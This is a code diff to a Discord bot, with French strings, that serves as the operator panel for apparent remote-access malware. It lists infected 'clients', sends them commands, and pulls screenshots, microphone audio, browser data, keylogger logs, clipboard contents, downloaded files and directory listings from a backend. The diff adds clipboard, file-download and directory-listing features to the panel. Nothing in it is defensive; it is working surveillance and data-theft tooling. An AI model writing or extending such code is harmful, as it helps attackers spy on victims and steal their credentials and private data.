@@ -12,7 +12,8 @@ import {
     handleHelpCommand,
     handleListDataCommand,
     handleSendCommand,
-    handleLivestreamCommand
+    handleLivestreamCommand,
+    handleListDirectoriesClientCommand
 } from "./utils/handleCommands.js";
 
 const { TOKEN, API_BASE_URL } = config;
@@ -34,43 +35,56 @@ client.on('interactionCreate', async interaction => {
             case 'command':
                 await handleSendCommand(interaction);
                 break;
-            case 'listdata':
+            case 'list_data':
                 await handleListDataCommand(interaction);
                 break;
-            case 'livestream':
+            case 'live_stream':
                 await handleLivestreamCommand(interaction);
                 break;
             case 'clients':
                 await handleClientsCommand(interaction);
                 break;
+            case 'list_directories_client':
+                await handleListDirectoriesClientCommand(interaction);
+                break;
         }
     } else if (interaction.isButton()) {
         const [type, clientId, browser] = interaction.customId.split('_');
-        await fetchDataAndUpdateInteraction(type, interaction, clientId, browser);
+        if(type !== 'next' && type !== 'previous'){
+            await fetchDataAndUpdateInteraction(type, interaction, clientId, browser);
+        }
+
     } else if (interaction.customId === "select_screenshot") {
         const screenshotId = interaction.values[0];
         const endpoint = `${API_BASE_URL}/screenshot/image/${screenshotId}`;
         const fileName = "screenshot.png";
         await handleFileResponse(interaction, endpoint, fileName, "", 'image');
+
     } else if (interaction.customId === "select_microphone") {
         const microphoneId = interaction.values[0];
         const endpoint = `${API_BASE_URL}/microphone/audio/${microphoneId}`;
         const fileName = `audio_${microphoneId}.wav`;
         await handleFileResponse(interaction, endpoint, fileName, "Voici l'enregistrement audio :", 'audio');
+
     } else if (interaction.customId === "select_browserdata") {
         const [browserDataId, filename] = interaction.values[0].split('_');
         const endpoint = `${API_BASE_URL}/browser/data/${browserDataId}`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
+
     } else if (interaction.customId === "select_keylogger") {
-        const keyloggerDataId = interaction.values[0];
+        const [keyloggerDataId, filename] = interaction.values[0].split('_');
         const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
-        const filename = `keylogger_${keyloggerDataId}.txt`;
+        await handleFileResponse(interaction, endpoint,filename, "Voici le contenu du fichier :", 'text');
+
+    } else if (interaction.customId === "select_clipboard") {
+        const [clipboardDataId, filename] = interaction.values[0].split('_');
+        const endpoint = `${API_BASE_URL}/clipboard/content/${clipboardDataId}`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
-    } else if (interaction.customId === "select_papier") {
-        const papierDataId = interaction.values[0];
-        const endpoint = `${API_BASE_URL}/papier/papier/${papierDataId}`;
-        const filename = `papier_${papierDataId}.txt`;
-        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
+
+    }else if (interaction.customId === "select_downloadfile") {
+        const [downloadFileId, filename] = interaction.values[0].split('_');
+        const endpoint = `${API_BASE_URL}/download/file/${downloadFileId}`;
+        await handleFileResponse(interaction, endpoint, filename,"Voici le contenu du fichier :", 'text');
     }
 
 });
